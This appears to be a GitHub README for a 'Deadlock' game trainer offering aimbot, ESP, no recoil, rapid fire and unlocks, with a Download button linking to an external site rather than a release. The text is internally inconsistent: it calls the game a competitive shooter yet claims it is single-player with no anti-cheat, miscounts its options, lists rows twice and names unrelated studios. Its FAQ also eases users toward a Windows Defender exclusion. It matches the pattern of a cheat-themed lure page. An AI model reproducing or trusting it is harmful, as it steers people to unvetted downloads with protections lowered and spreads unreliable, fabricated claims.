<div align="center">

# Deadlock — Trainer

**Aimbot, ESP, FOV, No Recoil, Rapid Fire, and more**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-ff0000?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-6%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="https://example.com/screenshot.png" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Deadlock is a competitive first-person shooter that requires precise aim and quick reflexes. The game's difficulty can be overwhelming, especially for new players, as it demands a high level of skill to progress.

The obvious brute-force option of simply grinding through the game to unlock everything is usually the wrong pick. This trainer provides a more efficient way to progress through the game, saving time and effort.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Aimbot | `F1` | Automatically aims at enemies |
| ESP | `F2` | Shows the location of enemies and items |
| FOV | slider | Adjusts the field of view |
| No Recoil | `F3` | Removes weapon recoil |
| Rapid Fire | slider | `1x`–`50x`, default `3x` |
| No Spread | slider | `0%`–`100%` — reduces weapon spread |
| Unlock all Weapons | `F4` | `crew` Unlocks all weapons in the game |
| Free Camera | `F5` | `bypass` Allows free camera movement |
| Unlock all Attachments | — | `save` Unlocks all weapon attachments |
| Unlock all Skins | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`crew`**: changes the shared session · **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`EA`**: unfinished Early Access system · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Set Aimbot to `F1`, ESP to `F2`, and FOV to `110 deg` for a balanced experience. This combination removes the frustration of missing shots and seeing enemies clearly. The game's difficulty remains intact.

> [!WARNING]
> Using the Free Camera option can ruin the game's immersion and may cause issues with the game's physics. Use at your own risk.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Single-player only, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>How does the Aimbot work?</summary>
The Aimbot uses advanced algorithms to predict enemy movements and adjust the aim accordingly. It is designed to be as unobtrusive as possible while still providing a significant advantage.
</details>

<details>
<summary>Is there a known game bug that this helps with?</summary>
Yes, there is a known issue with the game's physics engine that can cause weapons to float in mid-air. The Free Camera option can help mitigate this issue.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Some options do nothing | That memory allocates only in a battle. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| Game-specific issue | If it is a known game bug rather than yours, say so and point at the developer's notes. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 2023-11-15 — first release. 6+ options across Aimbot, ESP, FOV, No Recoil, Rapid Fire, and No Spread. Aimbot and ESP are enabled by default for a balanced experience.

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Arkane Studios, Bethesda Softworks or Valve. Deadlock and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
